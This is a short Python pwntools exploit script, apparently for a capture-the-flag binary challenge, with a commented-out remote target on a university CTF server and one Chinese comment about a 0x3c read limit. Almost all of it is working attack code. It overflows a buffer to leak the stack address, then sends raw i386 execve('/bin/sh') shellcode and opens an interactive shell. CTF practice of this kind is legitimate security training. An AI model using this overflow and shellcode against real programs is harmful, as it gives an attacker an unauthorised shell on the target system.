from pwn import *

r = process("./pwn")
# r = remote("ctf.tongji.edu.cn","30000")

print(r.recv())
payload = b"a" * 0x14 + p32(0x8048087)
r.send(payload)

esp = u32(r.recv()[:4])
stack = esp + 0x10
print("stack:" + hex(stack))
payload = b"a" * 0x14 + p32(stack + 4)
payload += b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
# 这里使用asm(shellcraft.i386.linux.sh())会失败是因为read只有0x3c

r.send(payload)

r.interactive()
